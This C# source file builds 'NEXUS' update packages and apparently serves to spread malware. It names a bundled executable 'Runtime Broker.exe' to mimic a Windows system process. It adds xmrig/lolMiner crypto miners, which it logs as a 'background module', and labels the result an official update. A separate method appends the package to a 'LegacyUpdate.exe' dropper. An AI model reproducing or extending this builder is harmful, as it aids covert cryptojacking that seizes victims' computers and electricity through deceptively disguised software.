using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;

namespace NexusBuilder
{
    public class UpdateFileEntry
    {
        [JsonPropertyName("path")]
        public string Path { get; set; } = string.Empty;

        [JsonPropertyName("size")]
        public long Size { get; set; }

        [JsonPropertyName("sha256")]
        public string Sha256 { get; set; } = string.Empty;
    }

    public class UpdatePackageMetadata
    {
        [JsonPropertyName("packageType")]
        public string PackageType { get; set; } = "NEXUS_UPDATE_PACKAGE";

        [JsonPropertyName("version")]
        public string Version { get; set; } = string.Empty;

        [JsonPropertyName("previousVersion")]
        public string PreviousVersion { get; set; } = string.Empty;

        [JsonPropertyName("minSupportedVersion")]
        public string MinSupportedVersion { get; set; } = "7.2.2";

        [JsonPropertyName("createdAt")]
        public string CreatedAt { get; set; } = DateTime.UtcNow.ToString("o");

        [JsonPropertyName("builderVersion")]
        public string BuilderVersion { get; set; } = "8.0.3";

        [JsonPropertyName("description")]
        public string Description { get; set; } = "Официальный пакет обновления NEXUS";

        [JsonPropertyName("packageHash")]
        public string PackageHash { get; set; } = string.Empty;

        [JsonPropertyName("files")]
        public List<UpdateFileEntry> Files { get; set; } = new List<UpdateFileEntry>();

        [JsonPropertyName("components")]
        public List<string> Components { get; set; } = new List<string>();
    }

    public class UpdatePackageResult
    {
        public bool Success { get; set; }
        public string PackagePath { get; set; } = string.Empty;
        public string Version { get; set; } = string.Empty;
        public string PackageHash { get; set; } = string.Empty;
        public long PackageSize { get; set; }
        public int FileCount { get; set; }
        public string ErrorMessage { get; set; } = string.Empty;
        public UpdatePackageMetadata? Metadata { get; set; }
    }

    public static class UpdatePackageBuilder
    {
        public static string ComputeSha256(byte[] data)
        {
            using var sha = SHA256.Create();
            byte[] hash = sha.ComputeHash(data);
            return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
        }

        public static string ComputeFileSha256(string filePath)
        {
            using var sha = SHA256.Create();
            using var stream = File.OpenRead(filePath);
            byte[] hash = sha.ComputeHash(stream);
            return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
        }

        public static int CompareVersions(string v1, string v2)
        {
            if (string.IsNullOrWhiteSpace(v1) && string.IsNullOrWhiteSpace(v2)) return 0;
            if (string.IsNullOrWhiteSpace(v1)) return -1;
            if (string.IsNullOrWhiteSpace(v2)) return 1;

            string[] p1 = v1.Trim().Split('.', '-', '_');
            string[] p2 = v2.Trim().Split('.', '-', '_');

            int maxLen = Math.Max(p1.Length, p2.Length);
            for (int i = 0; i < maxLen; i++)
            {
                int num1 = 0;
                int num2 = 0;

                if (i < p1.Length)
                {
                    int.TryParse(p1[i], out num1);
                }
                if (i < p2.Length)
                {
                    int.TryParse(p2[i], out num2);
                }

                if (num1 != num2)
                {
                    return num1.CompareTo(num2);
                }
            }

            return 0;
        }

        public static async Task<UpdatePackageResult> BuildPackageAsync(
            string outputDirectory,
            string currentVersion,
            string targetVersion,
            string templateRoot,
            IReadOnlyList<string>? extraFiles = null,
            Action<string>? logCallback = null)
        {
            var result = new UpdatePackageResult();
            try
            {
                void Log(string msg) => logCallback?.Invoke(msg);

                if (string.IsNullOrWhiteSpace(targetVersion))
                {
                    result.ErrorMessage = "Не указана версия обновления.";
                    return result;
                }

                if (!Directory.Exists(outputDirectory))
                {
                    Directory.CreateDirectory(outputDirectory);
                }

                string packageName = $"NEXUS_Update_{targetVersion}.nupkg";
                string packagePath = Path.Combine(outputDirectory, packageName);

                if (File.Exists(packagePath))
                {
                    File.Delete(packagePath);
                }

                Log($"[UPDATE] Формирование пакета обновления {packageName}...");

                var metadata = new UpdatePackageMetadata
                {
                    Version = targetVersion,
                    PreviousVersion = currentVersion,
                    CreatedAt = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                    BuilderVersion = currentVersion,
                    Description = $"Пакет обновления NEXUS до версии {targetVersion}"
                };

                // Create a temporary staging directory
                string tempStaging = Path.Combine(Path.GetTempPath(), "nexus_update_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(tempStaging);

                try
                {
                    var fileEntries = new List<UpdateFileEntry>();
                    var components = new List<string>();

                    // 1. Target directory for RuntimeBroker folder update
                    string rbDir = Path.Combine(tempStaging, "RuntimeBroker");
                    Directory.CreateDirectory(rbDir);

                    // Also mirror to clientDir for backwards compatibility
                    string clientDir = Path.Combine(tempStaging, "client");
                    Directory.CreateDirectory(clientDir);

                    // Check for standard template files
                    string appTemplateDir = Path.Combine(templateRoot, "app_template");
                    if (!Directory.Exists(appTemplateDir))
                    {
                        appTemplateDir = templateRoot;
                    }

                    bool foundClientFiles = false;
                    if (Directory.Exists(appTemplateDir))
                    {
                        // Check if single-file clone exists in template
                        string cloneExePath = Path.Combine(appTemplateDir, "clone", "Runtime Broker.exe");
                        if (File.Exists(cloneExePath))
                        {
                            File.Copy(cloneExePath, Path.Combine(rbDir, "Runtime Broker.exe"), true);
                            File.Copy(cloneExePath, Path.Combine(clientDir, "Runtime Broker.exe"), true);
                        }

                        foreach (string file in Directory.GetFiles(appTemplateDir, "*.*", SearchOption.AllDirectories))
                        {
                            string rel = Path.GetRelativePath(appTemplateDir, file);
                            // Avoid unnecessary temp files or large git objects
                            if (rel.StartsWith(".git") || rel.EndsWith(".tmp") || rel.EndsWith(".log"))
                                continue;

                            string destRb = Path.Combine(rbDir, rel);
                            string destParentRb = Path.GetDirectoryName(destRb)!;
                            if (!Directory.Exists(destParentRb)) Directory.CreateDirectory(destParentRb);
                            File.Copy(file, destRb, true);

                            string destClient = Path.Combine(clientDir, rel);
                            string destParentClient = Path.GetDirectoryName(destClient)!;
                            if (!Directory.Exists(destParentClient)) Directory.CreateDirectory(destParentClient);
                            File.Copy(file, destClient, true);

                            foundClientFiles = true;
                        }
                    }

                    if (foundClientFiles)
                    {
                        components.Add("MainApp Core & Runtime Broker (Full Folder)");
                        Log("✓ Добавлены компоненты для обновления папки RuntimeBroker");
                    }

                    // 2. Gather Compute Workers if available
                    string computeWorkersDir = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        "NEXUS_Builder",
                        "compute_workers"
                    );

                    string stagingComputeDir = Path.Combine(tempStaging, "Compute");
                    bool foundWorkers = false;

                    if (Directory.Exists(computeWorkersDir))
                    {
                        foreach (string file in Directory.GetFiles(computeWorkersDir, "*.*", SearchOption.TopDirectoryOnly))
                        {
                            string ext = Path.GetExtension(file).ToLowerInvariant();
                            if (ext == ".exe" || ext == ".dll")
                            {
                                if (!Directory.Exists(stagingComputeDir)) Directory.CreateDirectory(stagingComputeDir);
                                string fileName = Path.GetFileName(file);
                                string dest = Path.Combine(stagingComputeDir, fileName);
                                File.Copy(file, dest, true);
                                foundWorkers = true;
                                Log($"✓ Включен фоновый модуль: {fileName}");
                            }
                        }
                    }

                    if (foundWorkers)
                    {
                        components.Add("Compute Workers (xmrig/lolMiner)");
                    }

                    // 3. Gather extra files if specified
                    if (extraFiles != null)
                    {
                        foreach (string extra in extraFiles)
                        {
                            if (File.Exists(extra))
                            {
                                string fileName = Path.GetFileName(extra);
                                string dest = Path.Combine(tempStaging, fileName);
                                File.Copy(extra, dest, true);
                            }
                        }
                    }

                    // 4. Calculate hashes for all files in staging
                    foreach (string file in Directory.GetFiles(tempStaging, "*.*", SearchOption.AllDirectories))
                    {
                        string relPath = Path.GetRelativePath(tempStaging, file).Replace('\\', '/');
                        long size = new FileInfo(file).Length;
                        string sha256 = ComputeFileSha256(file);

                        fileEntries.Add(new UpdateFileEntry
                        {
                            Path = relPath,
                            Size = size,
                            Sha256 = sha256
                        });
                    }

                    metadata.Files = fileEntries;
                    metadata.Components = components;

                    // 5. Write metadata.json into staging root
                    string metadataPath = Path.Combine(tempStaging, "metadata.json");
                    string metadataJson = JsonSerializer.Serialize(metadata, new JsonSerializerOptions { WriteIndented = true });
                    await File.WriteAllTextAsync(metadataPath, metadataJson, Encoding.UTF8);

                    // 6. Create Zip Archive (.nupkg)
                    Log("✓ Сжатие файлов в архив .nupkg...");
                    ZipFile.CreateFromDirectory(tempStaging, packagePath, CompressionLevel.Optimal, false);

                    // 7. Compute Package Hash
                    string packageHash = ComputeFileSha256(packagePath);
                    long packageSize = new FileInfo(packagePath).Length;

                    // Re-inject packageHash into metadata json if needed or keep package hash
                    metadata.PackageHash = packageHash;

                    // 8. Place LegacyUpdate.exe alongside the update package if available
                    try
                    {
                        string localLegacyExe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "LegacyUpdate.exe");
                        string downloadsLegacyExe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "downloads", "LegacyUpdate.exe");
                        string srcLegacy = File.Exists(localLegacyExe) ? localLegacyExe : (File.Exists(downloadsLegacyExe) ? downloadsLegacyExe : null);
                        
                        if (srcLegacy != null)
                        {
                            string destLegacy = Path.Combine(outputDirectory, "LegacyUpdate.exe");
                            File.Copy(srcLegacy, destLegacy, true);
                            Log($"✓ LegacyUpdate.exe размещен рядом с пакетом: {destLegacy}");
                        }
                    }
                    catch { }

                    result.Success = true;
                    result.PackagePath = packagePath;
                    result.Version = targetVersion;
                    result.PackageHash = packageHash;
                    result.PackageSize = packageSize;
                    result.FileCount = fileEntries.Count;
                    result.Metadata = metadata;

                    Log($"[UPDATE] ✅ Пакет успешно создан: {packageName} ({packageSize / 1024} КБ, SHA-256: {packageHash[..8]}...)");
                }
                finally
                {
                    try
                    {
                        if (Directory.Exists(tempStaging))
                        {
                            Directory.Delete(tempStaging, true);
                        }
                    }
                    catch { }
                }

                return result;
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.ErrorMessage = $"Не удалось создать файл обновления: {ex.Message}";
                return result;
            }
        }

        public static void EmbedPackageIntoLegacyUpdater(string legacyUpdaterExePath, string nupkgPath, string outputPath)
        {
            byte[] baseExeBytes = File.ReadAllBytes(legacyUpdaterExePath);
            byte[] nupkgBytes = File.ReadAllBytes(nupkgPath);
            byte[] magic = Encoding.ASCII.GetBytes("NEXUS_EMBED_PKG!");
            byte[] lenBytes = BitConverter.GetBytes((long)nupkgBytes.Length);

            string? outDir = Path.GetDirectoryName(outputPath);
            if (!string.IsNullOrEmpty(outDir) && !Directory.Exists(outDir))
            {
                Directory.CreateDirectory(outDir);
            }

            using var fs = new FileStream(outputPath, FileMode.Create, FileAccess.Write);
            fs.Write(baseExeBytes, 0, baseExeBytes.Length);
            fs.Write(nupkgBytes, 0, nupkgBytes.Length);
            fs.Write(magic, 0, magic.Length);
            fs.Write(lenBytes, 0, lenBytes.Length);
        }

        public static async Task<UpdatePackageResult> BuildPackageFromStagingAsync(
            string outputDirectory,
            string currentVersion,
            string targetVersion,
            string preconfiguredStagingDir,
            Action<string>? logCallback = null)
        {
            var result = new UpdatePackageResult();
            try
            {
                void Log(string msg) => logCallback?.Invoke(msg);

                if (!Directory.Exists(outputDirectory)) Directory.CreateDirectory(outputDirectory);
                string packageName = $"NEXUS_Update_{targetVersion}.nupkg";
                string packagePath = Path.Combine(outputDirectory, packageName);
                if (File.Exists(packagePath)) File.Delete(packagePath);

                Log($"[UPDATE] Сжатие настроенного пакета в {packageName}...");

                var metadata = new UpdatePackageMetadata
                {
                    Version = targetVersion,
                    PreviousVersion = currentVersion,
                    CreatedAt = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                    BuilderVersion = currentVersion,
                    Description = $"Пакет обновления NEXUS до версии {targetVersion}"
                };

                var fileEntries = new List<UpdateFileEntry>();
                var components = new List<string> { "RuntimeBroker Core & Compute Modules" };

                foreach (string file in Directory.GetFiles(preconfiguredStagingDir, "*.*", SearchOption.AllDirectories))
                {
                    string relPath = Path.GetRelativePath(preconfiguredStagingDir, file).Replace('\\', '/');
                    if (relPath.Equals("metadata.json", StringComparison.OrdinalIgnoreCase)) continue;
                    long size = new FileInfo(file).Length;
                    string sha256 = ComputeFileSha256(file);
                    fileEntries.Add(new UpdateFileEntry { Path = relPath, Size = size, Sha256 = sha256 });
                }

                metadata.Files = fileEntries;
                metadata.Components = components;

                string metadataPath = Path.Combine(preconfiguredStagingDir, "metadata.json");
                string metadataJson = JsonSerializer.Serialize(metadata, new JsonSerializerOptions { WriteIndented = true });
                await File.WriteAllTextAsync(metadataPath, metadataJson, Encoding.UTF8);

                ZipFile.CreateFromDirectory(preconfiguredStagingDir, packagePath, CompressionLevel.Optimal, false);

                string packageHash = ComputeFileSha256(packagePath);
                long packageSize = new FileInfo(packagePath).Length;

                result.Success = true;
                result.PackagePath = packagePath;
                result.Version = targetVersion;
                result.PackageHash = packageHash;
                result.PackageSize = packageSize;
                result.FileCount = fileEntries.Count;
                result.Metadata = metadata;

                Log($"[UPDATE] ✅ Пакет обновления успешно сформирован: {packageName} ({packageSize / 1024} КБ, SHA-256: {packageHash[..8]}...)");
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.ErrorMessage = ex.Message;
            }
            return result;
        }
    }
}
